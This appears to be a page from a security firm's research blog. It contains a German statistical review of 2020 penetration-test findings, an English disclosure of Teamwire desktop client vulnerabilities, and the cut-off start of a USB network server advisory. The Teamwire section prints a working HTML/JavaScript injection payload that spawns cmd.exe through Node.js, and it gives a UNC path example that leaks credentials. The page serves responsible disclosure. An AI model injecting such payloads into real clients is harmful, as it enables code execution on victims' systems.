Für die Kategorien wurde sich zunächst an den „OWASP Top 10“ orientiert. Diese Veröffentlichung des OWASP-Projektes aus dem Jahr 2017[[1]](#_ftn1) umfasst eine Systematik der schwerwiegendsten Schwachstellen für Web-Anwendungen, die dort auf der Grundlage einer Berechnung der Schweregrade auf der Basis von Häufigkeiten und Auswirkungen erstellt wurde. Die Kategorien lassen sich dabei zum Teil auch auf andere Testziele gut übertragen, decken jedoch nicht alle Befunde vollständig ab, sodass einige selbst erstellte Kategorien ergänzt wurden. Diese umspannen den gesamten Zyklus der Softwareentwicklung und des Betriebs von Architektur und Design über Implementierung bis hin zur Systempflege. Dadurch lassen sich auch entsprechende Sicherheitslücken jenseits von Web-Anwendungen feingranular einordnen.

Die Aggregation der Daten bringt einige praktische Schwierigkeiten mit sich: Aufgrund der Verschiedenartigkeit der durchgeführten Tests ließen sich keine relevanten Aussagen zur Häufigkeit von Schwachstellen in einem bestimmten System oder einer Anwendung ermitteln. Auch werden in den Projektberichten gleichartige Schwachstellen auf verschiedenen System häufig zu einem Befund zusammengefasst, sodass eine Zählung der Befunde hier ebenfalls nur begrenzte Aussagekraft hat. Aufgrund dessen wird als Maß die relative Häufigkeit von Projekten, in welchen ein Befund der entsprechenden Kategorie auftaucht, verwendet. Dadurch wird deutlich, welche Schwachstellen besonders häufig in Projekten auftreten und welche eher selten oder nur in besonderen Zielumgebungen vorkommen.

Für die Bewertung der Relevanz einer [Schwachstelle](https://research.hisolutions.com/2023/06/eine-sicherheitsluecke-ausnutzen-um-eine-sicherheitsfunktion-umzusetzen/) wird in den Prüfberichten ein standardisiertes Schema verwendet, welches aus der Bewertung der Komplexität des Angriffs und des zu erwartenden Schadens zu einer Einordnung in die folgenden Kategorien führt:

CRITICAL (C)            Systeme akut gefährdet, umgehendes Handeln erforderlich

HIGH (H)                   hohe praktische Relevanz – sollte priorisiert behoben werden

MEDIUM (M)             relevantes Schadenspotenzial in Verbindung mit anderen Problemen

LOW (L)                    für sich genommen keine unmittelbare Gefahr

Rein informative Befunde (z. B. festgestellte funktionale Fehler ohne Sicherheitsbezug) wurden in der Auswertung nicht berücksichtigt.

## Ergebnisse

Im Folgenden werden die Erkenntnisse aus der Auswertung der Penetrationstests des letzten Jahres vorgestellt. Es werden die durch die Tests gefundenen Sicherheitslücken im Vergleich der Ergebnisse der letzten Jahre begutachtet. Hierfür werden die Kategorie und der Schweregrad der Schwachstellen betrachtet. Die Auswertung von Nachtest-Ergebnissen erlaubt auch in diesem Jahr wieder eine Untersuchung über die Effizienz der im Anschluss an Penetrationstests durchgeführten Maßnahmen.

Bei der Auswertung der Projekte des Jahres 2020 müssen die Besonderheit des Jahres in Bezug auf die globale Covid-19-Pandemie im Blick behalten werden. So ist es dieses Jahr besonders wichtig, die Entwicklung der Ergebnisse der Penetrations- und Schwachstellentests im Zusammenhang mit den Einschränkungen zur Pandemiebekämpfung und den Auswirkungen auf die verschiedenen Projektarten zu begutachten und zu bewerten.

Die erste Abbildung zeigt die Entwicklung des Schweregrades von Sicherheitslücken von 2013 bis 2020. In diesem Fall werden alle Funde eines Penetrationstests betrachtet. Jedem Test wird die höchste Kritikalität seiner Funde zugeordnet, da eine einzige Schwachstelle des entsprechenden Schweregrades genügen kann, die Sicherheit des gesamten Systems zu beeinträchtigen.

Von 2013 bis 2015 gab es einen klaren Anstieg der kritischen, hohen und mittleren Befunde. Die Anzahl dieser sank in den nächsten Jahren bis 2018 zwar deutlich, um 2019 erneut stark zu steigen. Wie bereits im Bericht des letzten Jahres vermutet, liegt der starke Anstieg der als hoch eingestuften Funde in 2019 vermutlich im Rahmen der kurzzeitigen Schwankungen, welche zwar nicht direkt einen Negativtrend darstellt, aber dennoch beobachtet werden sollte.

Die Entwicklung der Kritikalitätsverteilung im Jahr 2020 zeigt im Vergleich zu 2019 einen Anstieg der Schwachstellen mit mittleren und niedrigen Auswirkungen und damit einhergehend eine Abnahme der kritischen und hohen Schwachstellen. Der Grund für diesen starken Unterschied liegt allerdings nicht in einem wesentlich verbesserten Sicherheitsniveau der Untersuchungsgegenstände, sondern lässt sich vielmehr durch die Auswirkungen der Covid-19-Pandemie erklären: Durch die Maßnahmen gegen die Pandemie (z. B. Lockdowns, Reisebeschränkungen und Home-Office-Regelungen) konnten im Jahr 2020 deutlich weniger interne Penetrationstests durchgeführt werden. Im Gegensatz zu externen Prüfungen über das Internet werden bei Penetrationstests in internen Netzwerken fast ausnahmslos eine wesentlich höhere Anzahl an Befunden und Schwachstellen mit hohen und kritischen Auswirkungen aufgedeckt.

Dies liegt unter anderem daran, dass extern erreichbare Systeme täglich im Fokus verschiedenster Angreifer stehen und kritische Schwachstellen kurzfristig ausgenutzt werden. Je nach den Folgen der Ausnutzung und gegebenenfalls vorhandener öffentlicher Berichterstattung zu den Schwachstellen führt dies dazu, dass Schwachstellen in externen Systemen schneller erkannt und behandelt werden. Dies gilt umso mehr, als dass heutzutage ein Großteil der Unternehmen weiterhin einen Netzwerkschutz nach dem Perimeter-System betreiben. Die Absicherung nach außen steht dabei im Fokus der Sicherheitsmaßnahmen, wobei die Behandlung von Sicherheitsrisiken in internen Systemen nachrangig behandelt wird oder durch Ressourcenmangel nicht oder nur stark verzögert erfolgen kann.

![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2021/09/image.png)

Abbildung 1: Entwicklung der Kritikalität von 2013 bis 2020

Um die Sicherheit von bestehenden Systemen zu verbessern und Sicherheitsaspekte im Entwurf neuer Systeme zu berücksichtigen, ist es wichtig zu verstehen, welche Art von Sicherheitslücken besonders häufig auftritt und welche Auswirkungen dies haben kann.

In Abbildung 2 wird daher zunächst die Entwicklung des Auftretens bestimmter Fehlerklassen in den letzten Jahren gezeigt. Dargestellt wird der Anteil der Penetrationstests, welche mindestens einen Befund der Kategorie erzeugt haben.

Im abgelaufenen Jahr ist besonders zu bemerken, dass eine Preisgabe von schützenswerten Daten, welche im letzten Jahr stark gesunken war, erneut enorm angestiegen und nun wieder in 8 von 10 Fällen zu finden ist. Zugleich ist aber die Anzahl der fehlerhaften Konfigurationen mit Auswirkung auf die Sicherheit eines Systems nach einem dramatischen Anstieg im letzten Jahr wieder gesunken, wobei eine solche noch immer in 80 % der Penetrationstests aufzufinden ist. Auch Funde im Bereich der Injektion und fehlerhafter Authentifizierung oder Sitzungsverwaltung sind im Vergleich zum vorherigen Jahr wieder häufiger geworden, wobei in diesen Fällen der Anstieg um ca. 5 % im Bereich normaler Schwankungen liegt.

![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2021/09/image-1.png)

Abbildung 2: Relative Häufigkeit der Kategorien[[2]](https://research.hisolutions.com/wp-admin/post.php?post=2637&action=edit#_ftn2) von 2016 bis 2020

Positiv zu vermerken scheint, dass der Anteil der Funde im Bereich von Implementierungsfehlern, mangelnder Systempflege und fehlerhafter Authentifizierung oder Sitzungsverwaltung im Vergleich zu 2019 wieder stark sank. Wie schon bei der Kritikalitätsentwicklung sind jedoch auch diese Entwicklungen mit großer Wahrscheinlichkeit den Auswirkungen der Covid-19- Pandemie zuzurechnen, da Fehler in diesen Bereichen zum Großteil bei internen Penetrationstests bemerkt werden.

Abbildung 3 zeigt die Schwere der Befunde im vergangenen Jahr aufgeschlüsselt nach Kategorie und im Vergleich zu den Befunden des vorangegangenen Jahres. Angegeben wird dabei der Anteil der unterschiedlichen Kritikalitätswerte an den Gesamtbefunden der jeweiligen Kategorie.

![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2021/09/image-6.png)

Abbildung 3: Entwicklung der Kritikalität[[3]](#_ftn3) der Befunde nach Kategorie im Vergleich zum Vorjahr

Betrachtet man die Entwicklung der Häufigkeit der Kategorien zusammen mit der Kritikalität nach Kategorien, ergeben sich einige bemerkenswerte Veränderungen. So ist zwar die Häufigkeit der Funde im Bereich „Injektion“ nur leicht angewachsen, jedoch ist die Kritikalität der Funde in diesem Bereich, besonders von kritischen und hohen Funden, deutlich stärker gestiegen.

Im Gegenteil hierzu ist jedoch die Häufigkeit im Bereich „Fehlerhafter Authentifizierung oder Sitzungsverwaltung“ ähnlich zur Kategorie „Injektion“ gewachsen. Hier hat sich die Verteilung der Kritikalität allerdings in Richtung niedrig (low) verschoben.

Auch die Anzahl von Funden im Bereich des „Preisgebens von sensiblen Daten“ ist stark gestiegen – und ähnlich wie beim vorherigen Punkt ist auch hier die Verteilung der Kritikalität der Funde sogar noch eindeutiger in Richtung niedrig gewandert.

Während die Häufigkeit von Funden im Bereich des unzureichenden Loggings & Monitorings gesunken ist, ist hier die Kritikalität besonders stark angestiegen. Im Jahr 2020 wurden allerdings in diesem Bereich nur neun Funde entdeckt, im Gegensatz zum Vorjahr, wo es 22 Funde gab, weshalb die allgemeingültige Aussagekraft der Veränderung kritisch zu hinterfragen ist. Nichtsdestotrotz sollte dieser Bereich umso genauer im Blick behalten werden, da ein gutes Logging und Monitoring nicht nur bei der Fehlersuche, sondern auch bei der rechtzeitigen Erkennung und Behandlung von Angriffen essenziell ist.

Als letzter bemerkenswerter Punkt ist hervorzuheben, dass 40 % der Funde im Bereich von mangelnden Organisations- und Betriebsprozessen eine hohe Kritikalität vorzeigen und sogar bis zu 80 % als mittlere Kritikalität eingestuft werden.

## **Auswertung nach Testtyp**

HiSolutions bietet eine Vielzahl unterschiedlicher Sicherheitsüberprüfungen an. Vergleichsweise häufig und insbesondere periodisch wiederkehrend werden externe Penetrationstests und Web-Penetrationstests ausgeführt, bei denen das Testteam die gleichen Möglichkeiten wie externe Angreifer besitzt. Zusätzlich wird auch eine Vielzahl an internen Penetrationstests durchgeführt, welche die Untersuchung der Auswirkungen eines erfolgreichen Angriffes in der Praxis ermöglichen. Bei diesen stehen dem Testteam wesentlich mehr Möglichkeiten zur Verfügung, da sie sich im internen Netz des Auftraggebers befinden. Auch diverse Pentests und gezielte Prüfungen von Hardware-Systemen, Anwendungen und ICS-Umgebungen sowie Überprüfungen von Quellcode, System- und Netzwerk-Architekturen und der Konfiguration von IT-Systemen wurden im Jahr 2020 von HiSolutions durchgeführt.

Abbildung 4 zeigt die Kritikalität abhängig vom Typ des durchgeführten Tests und im Vergleich die Ergebnisse des Vorjahres. In einem Penetrationstest können mehrere Überprüfungen unterschiedlicher Art vorkommen. Für die Auswertung werden die einzelnen Testbestandteile aller Penetrationstests betrachtet. Die in Abbildung 4 dargestellte Kritikalitätsverteilung ergibt sich, wie in vorherigen Auswertungen, aus der Zuordnung jedes Testbestandteils zu seiner maximalen ermittelten Kritikalität. Für eine bessere Vergleichbarkeit werden relative Häufigkeiten dargestellt.

Um im Vergleich einen Mindestwert an Aussagekraft zu erzielen, werden nur Testtypen berücksichtigt, für welche im Jahr 2020 mindestens 10 Projekte durchgeführt wurden.

Die Auswertung nach Testtyp zeigt, dass die generelle Verteilung der in den Projekten beobachteten Kritikalitäten größtenteils konstant geblieben ist.

Nach wie vor gilt nachweisbar: Je mehr Zugang das Testteam hat, desto kritischer sind die aufgedeckten Sicherheitslücken. Zwar wurden im Fall der internen Penetrationstests nur noch in ungefähr 35 % der Prüfungen Befunde identifiziert, die als kritisch eingestuft wurden, der Anteil der sonstigen internen Pentests, die dann mindestens einen als „hoch“ eingestuften Befund enthalten, ist von ca. 40 % auf ca. 60 % der Gesamtzahl angestiegen.

Da durch die Corona-Pandemie deutlich mehr Überprüfungen von über das Internet erreichbaren Testgegenständen stattgefunden haben, ist die Entwicklung hier besonders interessant. Sowohl bei externen als auch bei Web-Penetrationstests sind besonders die Funde von kritischen und hohen Schwachstellen zurückgegangen. Das könnte darauf hinweisen, dass die Absicherung nach außen sich bei einigen Systemen im Vergleich zum Vorjahr verbessert hat. Ob dies dadurch begründet werden kann, dass durch die Pandemie deutlich mehr Personal im Home-Office arbeitete und somit die Schnittstellen nach außen stärker abgesichert werden mussten, muss durch andere Untersuchungen beleuchtet werden.

![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2021/09/image-3.png)

Abbildung 4: Entwicklung der maximalen Kritikalität nach Testtyp im Vergleich zum Vorjahr

## **Auswertung der Nachtests**

Anbieter von Penetrationstests empfehlen in der Regel eine Verifikation der im Anschluss umgesetzten Maßnahmen als wirkungsvolles Mittel zur Verbesserung der Sicherheitseigenschaften von IT-Systemen. Die tatsächliche Wirksamkeit der umgesetzten Maßnahmen wird im Folgenden an Beispielen aus der Praxis überprüft. Zu diesem Zweck werden Befunde betrachtet, bei denen ein Nachtest durch HiSolutions stattgefunden hat, also eine Überprüfung der nach dem Penetrationstest implementierten Maßnahmen.

Abbildung 5 zeigt die Anzahl der Befunde und deren Kritikalität nach Kategorien. Der obere Balken bezieht sich dabei auf die Befunde im initialen Penetrationstest, der untere auf die Befunde im Nachtest.[[4]](#_ftn4)

Im Allgemeinen kann erneut hervorgehoben werden, dass besonders kritische und hohe Schwachstellen bis auf wenige Ausnahmen erfolgreich behoben wurden. Allerdings waren in den Bereichen sicherheitskritische Fehlkonfiguration und Nutzen von Komponenten mit bekannten Schwachstellen selbst im Nachtest noch immer Schwachstellen der Kritikalität „hoch“ zu finden.

![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2021/10/image-1024x764.png)

Abbildung 5: Kritikalität im Vergleich vom Penetrationstest zum Nachtest 2020

Der Grund für die Unterschiede bei diesen beiden Kategorien war dabei häufig, dass es sich um schwerwiegende systematische Schwachstellen handelt, deren Behebung längere Zeit in Anspruch nimmt oder größere Umstrukturierungen notwendig macht. Bei Schwachstellen etwa, die auf veraltete Systeme und Komponenten zurückzuführen sind, ist ein funktionierendes Patch- und Life-Cycle-Management essenziell, um die Probleme dauerhaft zu beheben. Sind diese Management-Prozesse nicht ausreichend etabliert, werden Systeme im Nachgang an einen Penetrationstest oft einmalig aktualisiert, sind aber bis zum Zeitpunkt des Nachtests erneut veraltet. Vor dem Hintergrund, dass Ransomware-Trojaner und -Angreifer immer wieder Schwachstellen in veralteten Systemen ausnutzen, empfiehlt HiSolutions auch in internen Netzwerken dringend die Umsetzung eines zeitnahen Patch- und Life-Cycle-Managements.

## Fazit

Auch dieses Jahr zeigten die identifizierten Befunde, wie wichtig und notwendig Penetrationstests und praktische technische Sicherheitsüberprüfungen sind.

Schwachstellen in internen Netzwerken stellen nach wie vor den Großteil der Schwachstellen mit hohem oder kritischen Risiko für Unternehmen dar. Unter der Annahme, dass es Angreifern gelingt, die externen Sicherheitsmaßnahmen zu umgehen und in ein internes Netzwerk vorzudringen, spiegelt dieses in der Praxis ein beträchtliches Risiko wider. Auch die Erfahrungen von HiSolutions im Bereich Incident Response und Forensik und andere unabhängige Untersuchungen zeigen klar, dass Angreifer in internen Netzwerken gezielt Schwachstellen ausnutzen, um darüber ihre Berechtigungen zu erweitern und Schadsoftware auf weiteren Systemen zu verbreiten. Diverse in internen Penetrationstests identifizierte Angriffspfade ließen sich direkt oder in abgewandelter Form auch in realen Angriffen beobachten. Nur durch einen systematischen Umgang mit dem Thema IT-Sicherheit, welcher teilweise größere Umbau- und Um-Organisationsmaßnahmen und eine langfristige sicherheitsorientierte Ausrichtung in dem Bereich nach sich zieht, kann dieses komplexe Thema zukünftig verbessert werden.

Die sonstigen Entwicklungen der Zahlen aus diesem Jahr stehen stark unter dem Eindruck der durch die Covid-19-Pandemie veränderten Projektzusammensetzung. Üblicherweise in Web-Anwendungen und externen Systemen vorzufindende Schwachstellen wie die „Preisgabe schützenswerter Daten“ sind durch die gestiegene Anzahl an Projekten in diesem Bereich ebenfalls merklich angestiegen. Die Anzahl an kritischen und hoch eingestuften Schwachstellen ist, bedingt durch die geringere Anzahl an internen Penetrationstests bei Kunden vor Ort, insgesamt gesunken. Ein Blick in die Einzelprojekte zeigt jedoch kein signifikant gestiegenes Sicherheitsniveau in den einzelnen Bereichen.

Aus den Ergebnissen lässt sich auch ablesen, dass im Bereich des Loggings und Monitorings weiterhin größere Probleme existieren. Ein zielgerichtetes Logging und Monitoring wurde nur in wenigen Kundenumgebungen beobachtet. Teilweise war zwar eine umfangreiche Protokollierung eingerichtet, die Daten wurden aber nicht geeignet ausgewertet und konnten daher nicht effizient und präventiv genutzt werden. Da besonders dieser Bereich, wenn richtig durchgeführt, eine enorme Hilfe bei der Überprüfung von Systemen und insbesondere auch der frühzeitigen Erkennung von Sicherheitsvorfällen sein kann, empfehlen wir eine stärkere Fokussierung aus das Thema in der Zukunft.

Auch für das vergangene Jahr zeigen die Ergebnisse deutlich, dass anhand von Penetrationstests viele Sicherheitsprobleme in IT-Infrastrukturen erkannt werden können, die ohne externe Kontrolle (bis zu einem Angriff) verdeckt geblieben wären. Einmal identifiziert, führten die betroffenen Unternehmen in den meisten Fällen ausreichende Maßnahmen bis zum Nachtest durch, sodass die Probleme dauerhaft behoben wurden. Bei der Interpretation dieser Ergebnisse muss allerdings beachtet werden, dass die Durchführung eines Nachtests für sich bereits ein gesteigertes Sicherheitsbewusstsein oder etabliertere IT-Sicherheits-Strukturen bei Unternehmen aufzeigt. So werden Nachtests in der Regel nicht geplant und beauftragt, wenn keine Änderungen an den Systemen vorgenommen wurden. Auch wenn die Ergebnisse der Nachtests grundlegende Verbesserungen an den Systemen darlegen, zeigen sie auch deutlich, dass nicht immer alle angemahnten Schwachstellen tatsächlich effektiv behoben wurden. Die Durchführung von Nachtests ist damit weiterhin als effektives Mittel zur Bestätigung von getroffenen Maßnahmen sowie zur Identifikation möglicher Restrisiken anzusehen.

```
Übrigens: Unser Angebot im Bereich Pentest/Penetrationstest finden sie [hier](https://www.hisolutions.com/security-consulting/cybersecurity/penetrationstests-technische-audits).

```

---

[[1]](#_ftnref1) [https://www.owasp.org/index.php/Category:OWASP\_Top\_Ten\_Project](https://www.owasp.org/index.php/Category%3AOWASP_Top_Ten_Project)

[[2]](#_ftnref2) Die Kategorien „*XML External Entities ([OWASP](https://research.hisolutions.com/2021/04/owasp-mehr-als-die-top-10-sicherheitsrisiken-fuer-webanwendungen/) A4)*“ und „*Insecure Deserialization (OWASP A8)*“ sind aufgrund der geringen absoluten Zahlen aktuell nicht aufgeführt.

[[3]](#_ftnref3) Ohne Befunde, aus welchen sich keine direkten sicherheitsrelevanten Auswirkungen ergaben.

[[4]](#_ftnref4) Da lediglich Befunde betrachtet werden, für welche ein Nachtest stattgefunden hat, können nur etwa 20 % der Befunde verwendet werden. Es kann daher zu Abweichungen zu Abbildung 3 kommen, da für diese mehr Datenpunkte zur Verfügung stehen. Die Kategorie „Insufficient Logging & Monitoring (OWASP A10)“ wird mangels Daten nicht berücksichtigt.

[![](data:image/gif;base64...)![](data:image/gif;base64...)![](data:image/gif;base64...)![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2018/10/cropped-HiS_Logo_HintergrungWeiss-1_Research.jpg)](https://research.hisolutions.com/2020/08/web-vulnerabilities-are-coming-to-the-desktop-again-rces-and-other-vulnerabilities-in-teamwire/ "Web vulnerabilities are coming to the Desktop again – RCEs and other vulnerabilities in Teamwire")

[27. August 202030. Januar 2024](https://research.hisolutions.com/2020/08/web-vulnerabilities-are-coming-to-the-desktop-again-rces-and-other-vulnerabilities-in-teamwire/)[Allgemein](https://research.hisolutions.com/category/allgemein/), [Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/)
## [Web vulnerabilities are coming to the Desktop again – RCEs and other vulnerabilities in Teamwire](https://research.hisolutions.com/2020/08/web-vulnerabilities-are-coming-to-the-desktop-again-rces-and-other-vulnerabilities-in-teamwire/)

**TL;DR (Teamwire users):** Multiple vulnerabilities have been found in Teamwire which allow malicious users to execute commands on victim’s computers. Upgrade Teamwire to the newest version (at least v2.5.0 as of Jan 21, 2021) as soon as possible to fix the vulnerabilities.

**TL;DR (Technical):** Cross-site-scripting and HTML injections are common vulnerabilities in web applications. If a desktop application, like the Teamwire Windows client, builds on a web engine which is vulnerable to these issues, this can result in remote code execution on the client systems.

## Vulnerability Summary

A HiSolutions researcher discovered that code could be executed in other users clients if a crafted message was shown in their search results ([CVE-2024-24275](https://www.cve.org/CVERecord?id=CVE-2024-24275)). Another vulnerability in the handling of pasted text ([CVE-2024-24278](https://www.cve.org/CVERecord?id=CVE-2024-24278)) and potential issues that allowed for the injection of sanitized HTML-elements ([CVE-2024-24276](https://www.cve.org/CVERecord?id=CVE-2024-24276)) were found and reported to Teamwire.
Teamwire replied back that the issues were independently found in an internal security audit a few weeks before and released a new Teamwire version within a day.
When HiSolutions reviewed this new version, it was discovered that only a part of the reported vulnerabilities were fixed. Furthermore, the previously identified RCE ([CVE-2024-24275](https://www.cve.org/CVERecord?id=CVE-2024-24275)) vulnerability could be exploited again in this version, just slightly different this time. In the new version, code was executed when an attacker created a group with a specially crafted name and invited victims to the group as well as in any other places where the group name was shown (e.g. search results or group directory).

## Background

Teamwire uses different technologies for their Windows desktop client that contained the below mentioned vulnerabilities. The client is based on NW.js. As written in our [last article](https://research.hisolutions.com/category/advisories/) about a different set of Teamwire vulnerabilities:

> *NW.js is a technology that combines the browser engine WebKit with the JavaScript framework Node.js, and is often used to create cross-platform applications. This combination enables users to call Node.js functions directly from the DOM of the embedded Chromium browser.*

The application itself then uses, among other technologies, AngularJS for client side JavaScript functionality.

## **Vulnerability Details**

**Desktop client RCE through search results (CVE-2024-24275)**

In versions below 2.3.0 of the Teamwire Windows desktop client, when a message that contained HTML code was shown inside the search results, this HTML code was embedded inside the client without any sanitization or encoding. Any included HTML elements were rendered and JavaScript code executed, allowing for arbitrary code execution. This issue affected both the chat and the global search function. Through NodeJS functions, commands could be executed directly on the operating system of the victim.

If the attacker created an arbitrary group, posted messages similar to:

`<img src=x onerror="const spawn=require('child_process').spawn;spawn('cmd.exe',['/c','calc.exe']);console.log(1);//Something searchword">`

and invited a victim, the payload was planted inside the client application. When a victim then did a search (inside the chat or global search) for a word matching any of the additionally supplied words (see text in red in payload), the code was executed on the client system. For demonstration purposes, the program calc.exe was opened but any actions inside the application or on the system would have been possible.

![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2020/08/Teamwire_windows_desktop_search_result_RCE-1024x657.jpg)

Screenshot of the calc.exe program that was executed when JavaScript code embedded in a message from the attacker was executed after it matched the search of a victim.

The underlying reason for this behaviour seemed to be the function that normally provided the highlighting of the search words (`angular.module("Teamwire.filters").filter("highlight",`…). This function did not sanitize, filter or encode the messages in the search results before using the AngularJS function `trustAsHtml` and embedding the result. Any included HTML elements were therefore rendered and any contained JavaScript code executed.

This behaviour affected the versions of the Teamwire Windows desktop client between version numbers 2.0.1 and below 2.3.0. Older versions may be affected as well.
The vulnerability was fixed in version 2.3.0.
However, version 2.3.0 was affected in another way by the following vulnerability.

**Desktop client RCE through list names (also tracked under CVE-2024-24275)**

In version 2.3.0 of the Teamwire Windows desktop client, group names were embedded inside the client without any sanitization or encoding. Any included HTML elements were rendered and JavaScript code executed in multiple places, allowing for arbitrary code execution. Through NodeJS functions, commands could be executed directly on the operating system of the victim.

If the attacker created a group with the name

`<img src=x onerror="const spawn=require('child_process').spawn;spawn('cmd.exe',['/c','calc.exe']);console.log(1);//Something">`

and invited the victims, the code was executed on the client systems. For demonstration purposes, the program calc.exe was opened but any actions inside the application or on the system would have been possible.

![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2020/08/Teamwire_RCE_through_list_names.jpg)

Screenshot of the program calc.exe that was opened for demonstation purposes.

The injected code was executed at least in the following places:

* When a user viewed the tab „Directory“ and then „Lists“ and was added to the malicious group by the attacker
* When a user used the global search and the malicious group name matched the search word
* When a user viewed the members of a group chat that contained the malicious group as a member
* When a user wanted to create a new group chat and the malicious group was an element in the „Lists“ directory

This behaviour affected version 2.3.0 of the Teamwire Windows desktop client. Older versions were not affected.
The vulnerability was fixed in version 2.4.0.

**Automatic UNC path resolution in pasted text (CVE-2024-24278)**

If a user pasted text into the message area of the Teamwire Windows client and that text matched a UNC path, the Teamwire client automatically tried to connect to the system and proceeded to authenticate via SMB with the current Windows logon credentials. An attacker inside the internal network could use this vulnerability to capture hashed credentials or redirect the user authentication attempt to other systems.

For example: If a user pasted the text „`\\192.168.194.133\something\test.docx`“ into the message field, the client tried to access the SMB share on the system 192.168.194.133 immediately without showing the pasted text first.

This behaviour would be expected if a client would click on a link or open the path in the Windows explorer. It is however not expected if a user only pastes the text without submitting it or initiating any other action. Especially if a user copies text from a web page, where malicious content could be hidden by CSS, unintended text might be pasted into the application. The pasted content is only shown after the connection to the specified share was already established.

This behaviour affected all versions of the Teamwire Windows desktop clients between version numbers 2.0.1 and 2.4.0. Older versions may be affected as well. A newer version than 2.4.0 may include a fix but was not tested.

**Injection of sanitized HTML elements in multiple places(CVE-2024-24276******)****

At least four instances inside the Teamwire Windows client were identified, where user supplied HTML code was rendered inside the application. The HTML code however, was sanitized by the AngularJS `sanitize$` function, which prevented the insertion of malicious JavaScript code. An attacker would need to find a bypass for this function to elevate these issues into remote code exection vulnerabilities.
Without such a bypass, only harmless modifications like manipulation of the application appearance or embedding of external images was possbile.

The four identified instances were:

1. When an administrator renamed a chat, the new name was sent to all members of the group and the sanitized HTML was rendered
   ![Screenshot of HTML injection inside new group name](data:image/gif;base64...)![Screenshot of HTML injection inside new group name](https://research.hisolutions.com/wp-content/uploads/2020/08/Teamwire_Window_desktop_client_HTML_injection_1.jpg)
2. The message preview when a user answered another message
   ![Screenshot of HTML injection in message answer preview](data:image/gif;base64...)![Screenshot of HTML injection in message answer preview](https://research.hisolutions.com/wp-content/uploads/2020/08/Teamwire_Window_desktop_client_HTML_injection_2.jpg)
3. When a user with a manipulated name was removed from a group
   ![Screenshot of HTML injection when malicious user is removed from a chat](data:image/gif;base64...)![Screenshot of HTML injection when malicious user is removed from a chat](https://research.hisolutions.com/wp-content/uploads/2020/08/Teamwire_Window_desktop_client_HTML_injection_4.jpg)
4. When an administrator tried to leave a chat that still contained a group of which he was a member

This behaviour affected all versions of the Teamwire Windows desktop clients between version numbers 2.0.1 and 2.2.1. Older versions may be affected as well.
Instances 2 and 4 were fixed in version 2.3.0.
Instances 1 and 3 still exist in 2.3.0 and possibly later versions as well.

## Disclosure Timeline

* 25. August 2020 – HiSolutions reaches out to Teamwire to establish secure, encrypted communication via email so that vulnerability details can be sent
* 25. August 2020 – Teamwire provides a contact and the corresponding PGP key
* 25. August 2020 – HiSolutions sends the vulnerability details for the three vulnerabilities CVE-2024-24275, CVE-2024-24276, CVE-2024-24278
* 26. August 2020 – Teamwire responds that the mentioned issues were internally discovered a few weeks before and releases a new Teamwire version 2.3.0 that is supposed to contain the fixes
* 26. August 2020 – HiSolutions tests the new version
* 27. August 2020 – HiSolutions sends the details of the retest and the new vulnerability to the Teamwire contact
* 16. October 2020 – Teamwire publishes version 2.4.0 which includes fixes for some of the vulnerabilities
* 2020/2021 HiSolutions can no longer assess Teamwire and pauses the [responsible disclosure](https://research.hisolutions.com/2023/02/wenn-der-white-hat-hacker-anruft-aber-niemand-rangeht/) process
* 16. January 2024 – HiSolutions publishes the vulnerability details after a sufficient grace period

## Credits

The vulnerabilities were found by Denis Werner (HiSolutions AG) who also reviewed the fixes.

[![](data:image/gif;base64...)![](data:image/gif;base64...)![](data:image/gif;base64...)![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2018/10/cropped-HiS_Logo_HintergrungWeiss-1_Research.jpg)](https://research.hisolutions.com/2020/07/high-impact-vulnerabilites-in-multiple-usb-network-servers/ "High-Impact Vulnerabilites In Multiple USB Network Servers")

[15. Juli 20205. August 2020](https://research.hisolutions.com/2020/07/high-impact-vulnerabilites-in-multiple-usb-network-servers/)[Advisories](https://research.hisolutions.com/category/advisories/)
## [High-Impact Vulnerabilites In Multiple USB Network Servers](https://research.hisolutions.com/2020/07/high-impact-vulnerabilites-in-multiple-usb-network-servers/)

Within the scope of a recent penetration test and through individual research effort, HiSolutions‘ security consultants discovered multiple previously unknown high-impact vulnerabilities in USB network server firmwares (see individual issues for the CVE IDs). Devices of multiple vendors were affected by similar vulnerabilities. HiSolutions responsibly disclosed the vulnerabilities to the vendors and additionally provided feedback on the implemented patches.

## Background Information

USB network servers or USB network MTP and printer servers are devices that can be used to make USB devices accessible to multiple users via the network. Users install a software on their client and can then access USB devices without the need to physically plug the device into the local system. If devices are used by multiple users the devices do not have to be transfered between different systems each time the user changes. Use cases include shared USB network drives, USB Printers, or USB license dongles that can be used by authenticated users on the local network. All of the investigated devices were provided with an individual client software that runs on the local systems. All systems also exposed a web server that could be used to make administrative changes to the system.

## The Vulnerabilities

HiSolutions consultants discovered four noteable vulnerabilities in each of the investigated devices.
The devices were:

* TP-Link TL-PS310U (version v2.000, fixed in 2.079.000.t0210)
* Digitus da-70254 (version 2.073.000.E0008)
* Lindy No. 42633 (version v.2.078.000)
* one other reviewed device of an (at this time) undisclosed vendor

### Exposure of the Administrative Password Over Network Broadcast

*The following CVE IDs were issued for this vulnerability: CVE-2020-15054 (TP-Link), CVE-2020-15058 (Lindy), CVE-2020-15062 (Digitus).*

The USB network servers send the password of the local administrator account repeatedly and without request across the local Network via UDP broadcast. Every system on that network can read the password from these unencrypted broadcasts. The password is sent in UDP packets to the broadcast address 255.255.255.255 as can be seen in the following packet capture:

![wireshark packet capture screenshot of administrative password in udp network traffic](data:image/gif;base64...)![wireshark packet capture screenshot of administrative password in udp network traffic](https://research.hisolutions.com/wp-content/uploads/2020/07/administrative-password-in-udp-network-traffic.jpg)
Figure 1: UDP broadcast of the administrative password „PASSWORDABC“.

All systems in the local network receive the administrative password. In theory, the password is then used to locally check against the password entered by the client on the local system. In practice, an attacker can easily retrieve the password from the UDP broadcast messages and thus
